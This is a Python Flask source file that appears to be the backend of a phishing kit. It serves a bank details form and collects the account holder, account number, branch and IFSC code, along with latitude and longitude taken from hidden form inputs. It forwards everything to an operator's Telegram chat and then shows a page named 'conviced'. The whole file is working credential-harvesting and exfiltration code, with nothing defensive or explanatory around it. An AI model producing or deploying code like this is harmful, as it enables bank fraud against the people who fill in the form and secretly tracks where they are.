from flask import Flask, render_template, request, redirect, url_for
import telebot
import os
from dotenv import load_dotenv

# Load environment variables from a .env file
load_dotenv()

app = Flask(__name__)

# Telegram bot token and chat ID
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

@app.route('/')
def index():
    return render_template('bank_info.html')

@app.route('/submit-bank-info', methods=['POST'])
def submit_bank_info():
    # Get form data
    account_holder = request.form.get('account_holder')
    account_number = request.form.get('account_number')
    branch_name = request.form.get('branch_name')
    ifsc_code = request.form.get('ifsc_code')

    # Get location data from hidden inputs
    latitude = request.form.get('latitude')
    longitude = request.form.get('longitude')

    # Format the message with bank info and location
    message = (
        f"New Bank Information Submission💸:\n"

        f"\n"
        f"Account Holder: {account_holder}\n"
        f"Account Number: {account_number}\n"
        f"Branch Name: {branch_name}\n"
        f"IFSC Code: {ifsc_code}\n"


        f"\n\n"
        f"Location🗺️📍:\n"
        f"Latitude: {latitude}\n"
        f"Longitude: {longitude}"
    )

    # Send the message to the specified Telegram chat
    bot.send_message(CHAT_ID, message)

    # Redirect the user to a confirmation page
    return render_template('conviced.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)), debug=True)
